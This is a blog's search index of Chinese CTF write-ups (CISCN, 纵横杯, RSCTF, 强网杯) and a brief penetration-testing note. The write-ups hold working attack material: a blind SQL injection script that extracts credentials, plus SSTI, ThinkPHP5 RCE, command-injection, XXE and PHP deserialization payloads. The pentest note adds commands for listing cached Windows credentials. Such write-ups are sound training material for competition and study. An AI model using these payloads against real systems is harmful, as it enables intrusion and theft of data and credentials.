<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>2021年东北赛区ciscn分区赛wp</title>
    <link href="/2021/06/17/ciscn-northeast.html"/>
    <url>/2021/06/17/ciscn-northeast.html</url>
    
    <content type="html"><![CDATA[<h3 id="简单的注入"><a href="#简单的注入" class="headerlink" title="简单的注入"></a>简单的注入</h3><p>简单的测试之后：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><div class="code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><pre><code class="hljs plain">a&#x27;/**/or/**/IF(0,SLEEP(5),1)%23<br></code></pre></td></tr></table></figure><p>可以进行时间盲注<br>那么直接跑脚本:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs plain">import requests<br>import base64<br>import sys<br>import string<br>import hashlib<br>import io<br>import time<br>​<br>sys.stdout = io.TextIOWrapper(sys.stdout.buffer,encoding=&#x27;utf8&#x27;)        #改变标准输出的默认编码,否则s.text不能输出<br>ss = &quot;&quot;<br>x = string.printable<br>​<br>url = &quot;http://10.3.120.24/?c=UserLogin&amp;f=login&quot;<br>​<br>​<br>payload=&#123;<br>    &quot;username&quot;:&quot;&quot;,<br>    &quot;password&quot;:&quot;123&quot;<br>&#125;<br>#测试<br># r=requests.post(url,data=payload)<br># print(r.text)<br>​<br>for i in range(1,60):<br>    for j in x:<br>        #payload[&quot;username&quot;]=(&quot;123&#x27;/**/and/**/1=(ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema=database())),%s,1))=%s)=1%23&quot;)%(str(i),ord(j))<br>        #payload[&quot;username&quot;]=(&quot;a&#x27;/**/or/**/IF(substr(database(),&#123;&#125;,1)=&#x27;&#123;&#125;&#x27;,sleep(5),1)#&quot;).format(str(i),str(j))<br>        #payload[&quot;username&quot;]=(&quot;a&#x27;/**/or/**/IF((ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema=database())),&#123;&#125;,1))=&#123;&#125;),sleep(5),0)#&quot;).format(str(i),ord(j))<br>        #table : user<br>        #payload[&quot;username&quot;]=(&quot;a&#x27;/**/or/**/IF((ascii(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name=&#x27;user&#x27;)),%s,1))=%s),sleep(5),0)#&quot;)%(str(i),ord(j))<br>        payload[&quot;username&quot;]=(&quot;a&#x27;/**/or/**/IF((ascii(substr((select(group_concat(username,password))from(user)),%s,1))=%s),sleep(5),0)#&quot;)%(str(i),ord(j))<br>        # admin Admin@12999...<br>        #print(payload)<br>        try:<br>            r = requests.post(url=url,data=payload,timeout=3)<br>            print( r.text)<br>        except requests.exceptions.Timeout as e:<br>            ss += j<br>            print(ss)<br>            break<br>​<br></code></pre></td></tr></table></figure><p>最后得到表：user，列名：userid,username,password,<br>然后再提取数据，得到用户名admin密码Admin@12999…</p><p>登录后得到flag：<code>flag&#123;ba4oy6nwovvkz8fdxjz90geghdpstywu&#125;</code></p><h3 id="Be-Careful"><a href="#Be-Careful" class="headerlink" title="Be_Careful"></a>Be_Careful</h3><p>从<code>http://10.3.120.25/index.php?file=1.php</code>很容易看出是文件包含</p><p>伪协议读index.php源码，发现提示real_flag.php</p><p>同样提取real_flag.php的源码</p><p>发现只需要把69563214562转为十六进制即可绕过，</p><p>即访问：<code>?a=0x10324a6ae2</code>得到flag</p><p><code>flag&#123;ny2w6iezylnlamxfijufowhcpevjqdzd&#125;</code></p><h3 id="flagin"><a href="#flagin" class="headerlink" title="flagin"></a>flagin</h3><p>从post给dolongin.php的数据可以看到是xml格式的</p><p>那么自然想到利用xxe读文件</p><p>起初试了一下读取/etc/passwd，可以读到。</p><p>同样试了读取/flag，没有内容，</p><p>读/flag.txt提示姿势不对。</p><p>最后通过php伪协议读flag.txt文件</p><p><code>php://filter/read=convert.base64-encode/resource=/flag.txt</code></p><p>成功读到，解码后得到flag</p><h3 id="吐槽"><a href="#吐槽" class="headerlink" title="吐槽"></a>吐槽</h3><p>吐槽一下Console的那个guest/guest弱口令：对不起，是我字典不够强，不够充分，我太菜了。</p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>writeup</category>
      
    </categories>
    
    
    <tags>
      
      <tag>web</tag>
      
      <tag>wp</tag>
      
      <tag>ctf</tag>
      
      <tag>ciscn</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>纵横杯2020-WRITEUP</title>
    <link href="/2020/12/27/zongheng-wp.html"/>
    <url>/2020/12/27/zongheng-wp.html</url>
    
    <content type="html"><![CDATA[<h1 id="纵横杯WRITEUP"><a href="#纵横杯WRITEUP" class="headerlink" title="纵横杯WRITEUP"></a><strong>纵横杯WRITEUP</strong></h1><p>纵横杯的wp版权不仅仅属于本人，转载请注明来源。</p><h1 id="马赛克"><a href="#马赛克" class="headerlink" title="马赛克"></a>马赛克</h1><h2 id="操作内容："><a href="#操作内容：" class="headerlink" title="操作内容："></a>操作内容：</h2><p>根据题目mosaic以及得到的马赛克图片</p><p>利用工具Depix</p><p>github地址：<a href="https://github.com/beurtschipper/Depix">https://github.com/beurtschipper/Depix</a></p><p>EXP:</p><figure class="highlight python"><table><tr><td class="gutter"><div class="code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><pre><code class="hljs python">python depix.py -p mosaic.png -s images/searchimages/debruinseq_notepad_Windows10_closeAndSpaced.png -o flag.png<br></code></pre></td></tr></table></figure><p><img src="/images/Kgc41JQDHcI1qFQk.png!thumbnail" alt="图片"></p><p>成功得到flag.png</p><p>打开是：</p><p><img src="https://uploader.shimo.im/f/eV9jy9AvIp7oqYme.png!thumbnail?fileGuid=MKnRiUUP7yE3zW1Y" alt="图片"></p><p>根据题目信息，包裹字符串</p><p><strong>flag值：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">flag&#123;0123468abd68abd0123&#125;<br></code></pre></td></tr></table></figure><h1 id="Web-ezcms"><a href="#Web-ezcms" class="headerlink" title="Web-ezcms"></a><strong>Web-ezcms</strong></h1><h2 id="操作内容：-1"><a href="#操作内容：-1" class="headerlink" title="操作内容："></a><strong>操作内容：</strong></h2><p>扫描得到源代码<a href="http://www.zip">www.zip</a></p><p>下载后与官方版本对比，发现此处不同，猜测是ssrf：</p><p><img src="/images/WcWYwvdQT2ZqY0Ya.png!thumbnail" alt="图片"></p><p>根据注释得知是采集功能。</p><p>同时根据config.php的数据库密码是admin868,那么试了一下后台也是这个密码。</p><p>于此同时在github上也发现了对应的ssrf的issue：</p><p><a href="https://github.com/yzmcms/yzmcms/issues/53">https://github.com/yzmcms/yzmcms/issues/53</a></p><p>进入后台直奔采集功能，看了一下yzmcms的文档，把<a href="http://127.0.0.1/">http://127.0.0.1/</a>当作采集目标。</p><p>然后修改系统设置的统计代码为<a href="httpxxx://../../../../../../flag">jeseniscool</a></p><p>那么按如下配置即可采集到我们自定义的链接：</p><p><img src="/images/jaRag7YuYmni7jfA.png!thumbnail" alt="图片"></p><p>根据issue，可以看到，当scheme为未知协议时候会变成null，代表file协议。</p><p>试了读取etc/passwd成功了，</p><p>那么顺理成章读到flag文件</p><p><strong>flag值：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">flag&#123;3578aa8d-3fab-4042-988c-e94c8bcd127b&#125;<br></code></pre></td></tr></table></figure><h1 id="Web-hello-php"><a href="#Web-hello-php" class="headerlink" title="Web-hello_php"></a><strong>Web-hello_php</strong></h1><h2 id="操作内容：-2"><a href="#操作内容：-2" class="headerlink" title="操作内容："></a><strong>操作内容：</strong></h2><p>扫描得到源代码<a href="http://www.zip">www.zip</a></p><p>下载后进行审计，发现是后台上传（密码admin/admin888）phar</p><p>然后前台img利用phar://xxxxxxxxxxxx/ + 爆破文件名（十位时间戳很好爆破）+ file_exsits()进行触发。</p><p><a href="http://eci-2ze3qpk9e6qoiveebamt.cloudeci1.ichunqiu.com/?img=phar:///var/www/html/static/920827b634efb6f03d85bf5dc072cb4d.jpg">http://eci-2ze3qpk9e6qoiveebamt.cloudeci1.ichunqiu.com/?img=phar:///var/www/html/static/920827b634efb6f03d85bf5dc072cb4d.jpg</a></p><p>就这样，先写了个shell，</p><p>写完shell之后，直接post: </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">jesen=echo(file_get_contents(&quot;/flag&quot;));<br></code></pre></td></tr></table></figure><p><strong>flag值：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">flag&#123;376eb548-2f8a-4e5d-952f-6d130a300072&#125;<br></code></pre></td></tr></table></figure><h1 id="Web-大家一起来审代码"><a href="#Web-大家一起来审代码" class="headerlink" title="Web-大家一起来审代码"></a><strong>Web-</strong>大家一起来审代码</h1><h2 id="操作内容：-3"><a href="#操作内容：-3" class="headerlink" title="操作内容："></a><strong>操作内容：</strong></h2><p>源代码<a href="http://www.zip">www.zip</a></p><p>下载后进行搜索，搜索到已有代码审计的文章：<a href="https://www.freebuf.com/vuls/241106.html">https://www.freebuf.com/vuls/241106.html</a></p><p>后台是弱密码（密码admin/admin）</p><p>发现admin_weixin.php符合freebuf文章里面的后台RCE2，因此按照他给的构造，</p><p>我这里自定义了参数是dpic。</p><p>我让（记得url编码，否则会出现问题）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">dpic=&quot;);?&gt;&lt;?php $_=`/b?n/c?? /fl?g`; ?&gt;&lt;?=$_?&gt;<br></code></pre></td></tr></table></figure><p><img src="/images/HpizB2NaZQrohnjS.png!thumbnail" alt="图片"></p><p>就这样，直接就得到了flag</p><p><img src="/images/KbixtkRGwClWGX8b.png!thumbnail" alt="图片"></p><p><strong>flag值：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">flag&#123;5e20e6fb-cf3c-44f9-b605-c65d90cc77a9&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
      <tag>web</tag>
      
      <tag>writeup</tag>
      
      <tag>纵横杯</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>RSCTF2020_writeup</title>
    <link href="/2020/11/16/RSCTF2020writeup.html"/>
    <url>/2020/11/16/RSCTF2020writeup.html</url>
    
    <content type="html"><![CDATA[<h2 id="签到"><a href="#签到" class="headerlink" title="签到"></a><strong>签到</strong></h2><p>签到题关注两个公众号发送指定字符串即可</p><h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a><strong>WEB</strong></h2><h3 id="1-他们说php很弱"><a href="#1-他们说php很弱" class="headerlink" title="1. 他们说php很弱"></a><strong>1.</strong> <strong>他们说php很弱</strong></h3><p>打开网页，查看网页源代码看到submit.php的处理逻辑,那么自然想到数组绕过md5()的检查。那么按照这样来提交即可：<img src="/images/clip_image002-1605497495185.jpg" alt="img"></p><h3 id="2-my-sound"><a href="#2-my-sound" class="headerlink" title="2. my sound"></a><strong>2. my sound</strong></h3><p>查看返回的http header发现是一个python搭建的网站，那么猜测后端存在ssti漏洞，那么测试一下</p><figure class="highlight handlebars"><table><tr><td class="gutter"><div class="code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><pre><code class="hljs handlebars"><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">1</span>+<span class="hljs-number">3</span>&#125;&#125;</span><br></code></pre></td></tr></table></figure><p><img src="/images/clip_image004-1605497495186.jpg" alt="img"></p><p>可以看到1+3被执行了，那么使用网上公开的payload打就行了。</p><p>给个payload: </p><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="hljs-template-variable">&#123;&#123;()<span class="hljs-name">.__class__.__bases__</span>[0].__subclasses__()[80].__init__.__globals__.__builtins__[&#x27;open&#x27;](<span class="hljs-name">&#x27;/flag&#x27;</span>).read()&#125;&#125;</span><br></code></pre></td></tr></table></figure><h3 id="3-hash"><a href="#3-hash" class="headerlink" title="3. hash"></a><strong>3. hash</strong></h3><p>把密文扔进网站解密: <img src="/images/clip_image006-1605497495186.jpg" alt="img"></p><p>无奈发现需要付费，根据一共四位，而且是f开头猜测可能是fuck或者是flag</p><p>试了一下其实是flag这四个字符加密后的</p><p>那么直接根据源代码的逻辑直接访问/?act=user&amp;point=flag</p><p>即可拿到flag</p><h3 id="4-简单的sql注入"><a href="#4-简单的sql注入" class="headerlink" title="4. 简单的sql注入"></a><strong>4.</strong> <strong>简单的sql注入</strong></h3><p>表名是猜的users，通过注入获取密码：</p><p>使用的payload：</p><p>username=admin’ and 0 union select password,2 from users#&amp;password=aaa</p><p>得到: <img src="/images/clip_image008-1605497495186.jpg" alt="img"></p><p>解密MD5得到密码为:ctf2020</p><p>登录即可得到flag：<img src="/images/clip_image010-1605497495186.jpg" alt="img"></p><h3 id="5-trick"><a href="#5-trick" class="headerlink" title="5.trick"></a><strong>5.trick</strong></h3><p>原理就是</p><p>str_1 = “INF”</p><p>str_2 = 9e999999999999(由于这个数太大了，针对特大的数php直接表示为INF)</p><p>虽然反序列化后依然是double类型，但是这样就可以绕过判断，因为md5加密之前会把参数强制转为字符串类型，这样str_1==str_2==”INF” 了，至于get的传参是通过查阅文档得到的:</p><p><img src="/images/clip_image012-1605497495187.jpg" alt="img"></p><p><img src="/images/clip_image014.jpg" alt="img"></p><p>文档写道，会把[变成下划线，而且针对[后面的字符不会把.变成_</p><p>所以最终payload为:</p><p><a href="http://183.220.1.118:18471/?my[secret.key=O:8:&quot;get_flag&quot;:2:{s:5:&quot;str_1&quot;;s:3:&quot;INF&quot;;s:5:&quot;str_2&quot;;d:INF;}">http://183.220.1.118:18471/?my[secret.key=O:8:&quot;get_flag&quot;:2:{s:5:&quot;str_1&quot;;s:3:&quot;INF&quot;;s:5:&quot;str_2&quot;;d:INF;}</a></p><h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a><strong>MISC</strong></h2><h3 id="1-好可爱的加密"><a href="#1-好可爱的加密" class="headerlink" title="1. 好可爱的加密"></a><strong>1.</strong> <strong>好可爱的加密</strong></h3><p>aaencode加密，直接解密即可</p><h3 id="2-奇怪的码"><a href="#2-奇怪的码" class="headerlink" title="2. 奇怪的码"></a><strong>2.</strong> <strong>奇怪的码</strong></h3><p>可以看到是一个二维码（附件名字就png，把名字改成1.png就能打开了），发现此二维码缺少三个定位点导致扫描不到。那么利用任意软件把定位点补全即可。</p><p>扫描得到flag</p><h3 id="3-小姐姐"><a href="#3-小姐姐" class="headerlink" title="3.小姐姐"></a><strong>3.小姐姐</strong></h3><p>这个利用linux（kali）的strings xiaojiejie.jpg即可看到里面有flag{xjj_haokanma}的字符串，提交即可</p><h3 id="4-神秘的文件"><a href="#4-神秘的文件" class="headerlink" title="4. 神秘的文件"></a><strong>4.</strong> <strong>神秘的文件</strong></h3><p>打开发现是一个wireshark的数据包，利用 文件-导出http对象，把html文件导出即可</p><p>导出hehe.html:</p><p>发现代码的js被加密了，调试解密:</p><p><img src="/images/clip_image016.jpg" alt="img"></p><p>p就是解密后的:</p><p><img src="/images/clip_image018.jpg" alt="img"></p><p>逻辑有点啰嗦，直接在加密之前打印就行了</p><p><img src="/images/clip_image020.jpg" alt="img"></p><p>得到: flag{3c32b1cf66c70ae2178fd417fd051b3b}</p><p>其实原理就是hex加密flag</p><h3 id="5-GIF的秘密"><a href="#5-GIF的秘密" class="headerlink" title="5. GIF的秘密"></a><strong>5. GIF的秘密</strong></h3><p>扫描二维码，解base64，得到密码：0K_I_L0Ve_You_too</p><p>给的文件是个压缩包，需要改拓展名，改了之后输入给的密码解压即可。</p><p>解压完是一个缺文件头和文件为的gif图，用010editor修补一下文件头和文件尾即可，</p><p>然后使用stegsolve查看每一帧，最后一帧是flag，提交即可。</p><p><strong>6.</strong> <strong>探测卫星</strong></p><p>RX-SSTV mmsstv均可解码。</p><p><img src="/images/clip_image022.jpg" alt="img"></p><p>**<br>**</p><h2 id="CRYPTO"><a href="#CRYPTO" class="headerlink" title="CRYPTO"></a><strong>CRYPTO</strong></h2><h3 id="1-凯撒的宝藏"><a href="#1-凯撒的宝藏" class="headerlink" title="1.凯撒的宝藏"></a>1.凯撒的宝藏</h3><p>凯撒密码，在网上找了个脚本（网上的解密网站只能变换字母，这个是可以变换所有字符的）</p><p><img src="/images/clip_image024.jpg" alt="img"></p><p><img src="/images/clip_image026.jpg" alt="img"></p><p>然后把看着像密文的，用栅栏解密得到：</p><p>flag{cca604a6-fc10-4b8b-bf80-5076dce5b992}</p><h3 id="2-学密码从RSA开始"><a href="#2-学密码从RSA开始" class="headerlink" title="2. 学密码从RSA开始:"></a><strong>2.</strong> <strong>学密码从RSA开始:</strong></h3><p>链接后得到n e c</p><p>这个e太小了，直接给c开三次方即可得到明文的hex。</p><p><img src="/images/clip_image028.jpg" alt="img"></p><p>得到: 666c61677b64326338636462342d373561362d343031382d623133372d3539363037613139656332637d</p><p>hex转字符串得到：</p><p>flag{d2c8cdb4-75a6-4018-b137-59607a19ec2c}</p><h2 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a><strong>PWN</strong></h2><h3 id="1-CTFer"><a href="#1-CTFer" class="headerlink" title="1. CTFer"></a><strong>1. CTFer</strong></h3><p>偏移直接看ida，给了target函数，且未开任何保护</p><p>那么直接栈溢出覆盖RIP即可</p><p><img src="/images/clip_image030.jpg" alt="img"></p><h3 id="2-SHer"><a href="#2-SHer" class="headerlink" title="2. SHer"></a><strong>2. SHer</strong></h3><p>这个我感觉出题人忘记开保护了，直接导致和第一题一样了。</p><p>同样也是直接栈溢出覆盖RIP即可</p><p><img src="/images/clip_image032.jpg" alt="img"></p><h3 id="3-localover"><a href="#3-localover" class="headerlink" title="3. localover"></a><strong>3. localover</strong></h3><p><img src="/images/clip_image033.png" alt="img"></p><h3 id="4-random"><a href="#4-random" class="headerlink" title="4. random"></a><strong>4. random</strong></h3><p>这个原理其实是因为c语言需要给随机数设置种子，这题并没有，导致随机数始终是一个序列。经过测试，第一个随机数是0x6b8b4567</p><p>那么异或后结果就是2042590654</p><h3 id="5-assqww"><a href="#5-assqww" class="headerlink" title="5. assqww"></a><strong>5. assqww</strong></h3><p>思路就是泄露栈地址，然后根据栈地址的偏移，把两个变量覆盖成正确的。</p><p>吐了，研究一天的写got表，早知道先研究泄露内存了。</p><p><img src="/images/clip_image035.jpg" alt="img"></p><h2 id="REVERSE"><a href="#REVERSE" class="headerlink" title="REVERSE"></a><strong>REVERSE</strong></h2><h3 id="re1"><a href="#re1" class="headerlink" title="re1:"></a><strong>re1</strong>:</h3><p>直接记事本打开搜索flag即可</p><h3 id="re2"><a href="#re2" class="headerlink" title="re2:"></a><strong>re2:</strong></h3><p>ida打补丁，patch “jnz short loc_40114B”的jnz改成jz然后保存修改然后运行即可。</p><h3 id="re3"><a href="#re3" class="headerlink" title="re3:"></a><strong>re3:</strong></h3><p>直接angr秒了:</p><p><img src="/images/clip_image037.jpg" alt="img"></p><p>得到结果：<img src="/images/clip_image039.jpg" alt="img"></p><p>f5ce2c9f4a3e6aa21c786dba5301224c</p><p>用flag{}包裹即可</p><h3 id="re5"><a href="#re5" class="headerlink" title="re5:"></a><strong>re5:</strong></h3><p>ida的findcrypto插件找出了base64码表，那么把里面的字符串拼接好按base64解码即可。</p><p>这里有一个坑就是ida的字符串是按小端序存在的，因此需要把每一个字符串给逆过来。</p><p><img src="/images/clip_image040.png" alt="img"></p><p>解密得到：95a1446a7120e4af5c0c8878abb7e6d2</p><p>包裹上flag{}提交即可.</p><h3 id="re6"><a href="#re6" class="headerlink" title="re6:"></a><strong>re6:</strong></h3><p>直接看ida，找到主函数，</p><p>看代码，<img src="/images/clip_image042.jpg" alt="img"></p><p>操作选择42330</p><p>然后随便输入两个数即可拿到flag</p><h2 id="Intranet"><a href="#Intranet" class="headerlink" title="Intranet"></a><strong>Intranet</strong></h2><h3 id="DMZ"><a href="#DMZ" class="headerlink" title="DMZ:"></a><strong>DMZ:</strong></h3><p>thinkphp5，直接拿payload打就可以了:</p><p><a href="http://192.168.2.109/public/index.php?s=/index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=shell_exec&amp;vars[1][]=cat">http://192.168.2.109/public/index.php?s=/index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=shell_exec&amp;vars[1][]=cat</a> /flag</p>]]></content>
    
    
    <categories>
      
      <category>writeup</category>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
      <tag>writeup</tag>
      
      <tag>RSCTF</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>渗透中的一些总结</title>
    <link href="/2020/11/11/zongjie_st.html"/>
    <url>/2020/11/11/zongjie_st.html</url>
    
    <content type="html"><![CDATA[<p><strong>等待更新 2021-07-18</strong></p><h2 id="获取系统中缓存的账号-密码等"><a href="#获取系统中缓存的账号-密码等" class="headerlink" title="获取系统中缓存的账号,密码等"></a>获取系统中缓存的账号,密码等</h2><p>rundll32 keymgr,KRShowKeyMgr <strong>这个是GUI的，命令行用不了</strong></p><p>cmdkey /list</p><p><br><br><br><br><br><br></p>]]></content>
    
    
    <categories>
      
      <category>渗透</category>
      
      <category>渗透测试</category>
      
    </categories>
    
    
    <tags>
      
      <tag>渗透</tag>
      
      <tag>渗透测试</tag>
      
      <tag>WEB安全</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>强网杯2020部分writeup</title>
    <link href="/2020/08/24/qwb2020.html"/>
    <url>/2020/08/24/qwb2020.html</url>
    
    <content type="html"><![CDATA[<h1 id="强网杯2020部分writeup"><a href="#强网杯2020部分writeup" class="headerlink" title="强网杯2020部分writeup"></a>强网杯2020部分writeup</h1><h3 id="强网先锋-web辅助"><a href="#强网先锋-web辅助" class="headerlink" title="强网先锋 web辅助"></a><strong>强网先锋 web辅助</strong></h3><p>给了源码那就直接审计源码，构造利用链：</p><figure class="highlight php"><table><tr><td class="gutter"><div class="code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></div></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">require_once</span> <span class="hljs-string">&quot;common.php&quot;</span>;<br><span class="hljs-keyword">require_once</span> <span class="hljs-string">&quot;class.php&quot;</span>;<br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> topsolo(<span class="hljs-keyword">new</span> midsolo(<span class="hljs-keyword">new</span> jungle(<span class="hljs-string">&quot;Yasuo&quot;</span>))) ;<br><span class="hljs-variable">$b</span> = serialize(<span class="hljs-variable">$a</span>);<br><span class="hljs-variable">$b</span> = str_replace(<span class="hljs-string">&quot;name&quot;</span>,<span class="hljs-string">&quot;n\\61me&quot;</span>,<span class="hljs-variable">$b</span>);<br><span class="hljs-variable">$b</span> = str_replace(<span class="hljs-string">&quot;s:7:&quot;</span>,<span class="hljs-string">&quot;S:7:&quot;</span>,<span class="hljs-variable">$b</span>);<br><span class="hljs-variable">$b</span> = str_replace(<span class="hljs-string">&quot;\&quot;midsolo\&quot;:1&quot;</span>,<span class="hljs-string">&quot;\&quot;midsolo\&quot;:2&quot;</span>,<span class="hljs-variable">$b</span>);<br><span class="hljs-keyword">echo</span> urlencode(<span class="hljs-variable">$b</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>这里需要注意以下，midsolo的__wakeup会把name强制变成Yasuo，利用经典CVE绕过</p><p>还有需要注意，name这个字符串被check()函数拦截了，所以需要利用hex绕过过滤，然后把小写的s改成大写，小写的s是不会把\61识别hex的。然后就是字符串溢出了，关于溢出多少这个在本地试了很久.</p><p>最终payload:</p><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs taggerscript">http://eci-2ze9cia09xafs2dqysyx.cloudeci1.ichunqiu.com/?username=<span class="hljs-symbol">\0</span>*<span class="hljs-symbol">\0</span><span class="hljs-symbol">\0</span>*<span class="hljs-symbol">\0</span><span class="hljs-symbol">\0</span>*<span class="hljs-symbol">\0</span><span class="hljs-symbol">\0</span>*<span class="hljs-symbol">\0</span><span class="hljs-symbol">\0</span>*<span class="hljs-symbol">\0</span><span class="hljs-symbol">\0</span>*<span class="hljs-symbol">\0</span><span class="hljs-symbol">\0</span>*<span class="hljs-symbol">\0</span><span class="hljs-symbol">\0</span>*<span class="hljs-symbol">\0</span><span class="hljs-symbol">\0</span>*<span class="hljs-symbol">\0</span><span class="hljs-symbol">\0</span>*<span class="hljs-symbol">\0</span><span class="hljs-symbol">\0</span>*<span class="hljs-symbol">\0</span><span class="hljs-symbol">\0</span>*<span class="hljs-symbol">\0</span><span class="hljs-symbol">\0</span>*<span class="hljs-symbol">\0</span>&amp;password=ccc&quot;;s:8:&quot;<span class="hljs-symbol">\0</span>*<span class="hljs-symbol">\0</span>admin&quot;;i:1;s:7:&quot;<span class="hljs-symbol">\0</span>*<span class="hljs-symbol">\0</span>pass&quot;;O<span class="hljs-variable">%3A7%</span>3A<span class="hljs-variable">%22topsolo%</span>22<span class="hljs-variable">%3A1%</span>3A<span class="hljs-variable">%7BS%</span>3A7<span class="hljs-variable">%3A%</span>22<span class="hljs-variable">%00%</span>2A<span class="hljs-variable">%00n%</span>5C61ee<span class="hljs-variable">%22%</span>3BO<span class="hljs-variable">%3A7%</span>3A<span class="hljs-variable">%22topsolo%</span>22<span class="hljs-variable">%3A1%</span>3A<span class="hljs-variable">%7BS%</span>3A7<span class="hljs-variable">%3A%</span>22<span class="hljs-variable">%00%</span>2A<span class="hljs-variable">%00n%</span>5C61me<span class="hljs-variable">%22%</span>3BO<span class="hljs-variable">%3A7%</span>3A<span class="hljs-variable">%22midsolo%</span>22<span class="hljs-variable">%3A2%</span>3A<span class="hljs-variable">%7BS%</span>3A7<span class="hljs-variable">%3A%</span>22<span class="hljs-variable">%00%</span>2A<span class="hljs-variable">%00n%</span>5C61me<span class="hljs-variable">%22%</span>3BO<span class="hljs-variable">%3A6%</span>3A<span class="hljs-variable">%22jungle%</span>22<span class="hljs-variable">%3A1%</span>3A<span class="hljs-variable">%7BS%</span>3A7<span class="hljs-variable">%3A%</span>22<span class="hljs-variable">%00%</span>2A<span class="hljs-variable">%00n%</span>5C61me<span class="hljs-variable">%22%</span>3Bs<span class="hljs-variable">%3A5%</span>3A<span class="hljs-variable">%22Yasuo%</span>22<span class="hljs-variable">%3B%</span>7D<span class="hljs-variable">%7D%</span>7D<span class="hljs-variable">%7D</span><br></code></pre></td></tr></table></figure><p>这样就结束了，成功getflag</p><h3 id="强网先锋-主动"><a href="#强网先锋-主动" class="headerlink" title="强网先锋 主动"></a><strong>强网先锋 主动</strong></h3><p>先利用;执行多条命令，先找一下flag在哪里</p><p><code>http://39.96.23.228:10002/?ip=0;find / -name fla*</code></p><p>找到了：</p><p><img src="/images/za0aBPzTBDEtjiav__thumbnail.png" alt="img"></p><p>那么就直接读取:</p><p><code>http://39.96.23.228:10002/?ip=0;cat /var/www/html/fla*</code></p><p>这里用*是为了绕过正则表达式</p><p>查看源代码得到flag</p><p><img src="/images/2J5jOFBpjMBDGUPM__thumbnail.png" alt="img"></p><h3 id="强网先锋-upload"><a href="#强网先锋-upload" class="headerlink" title="强网先锋 upload"></a><strong>强网先锋 upload</strong></h3><p>给了个wireshark的数据包很明显看到post到了一个图片，导出来。看到post的地址为/steghide.php还有一个hint: </p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-comment">&lt;!--i use steghide with a good password--&gt;</span><br></code></pre></td></tr></table></figure><p>猜测应该是弱密码果然，打开kali，试了一下123456成功解开，</p><p><code>steghide extract -sf steghide.jpg</code></p><p>里面有flag.txt就是flag</p><h3 id="强网先锋-Funhash"><a href="#强网先锋-Funhash" class="headerlink" title="强网先锋 Funhash"></a><strong>强网先锋 Funhash</strong></h3><p>hash1的话需要爆破</p><p>跑了半个小时左右发现0e251288019的md4也是0e251288019那么hash1就成功了</p><p>到了hash2和hash3</p><p><code>/?hash1=0e251288019&amp;hash2=&amp;hash4=ffifdyop</code></p><p>我只传了hash2，那么hash2就是空字符串，hash3就是NULL，成功跳过第2关</p><p>第三关是参考了：<a 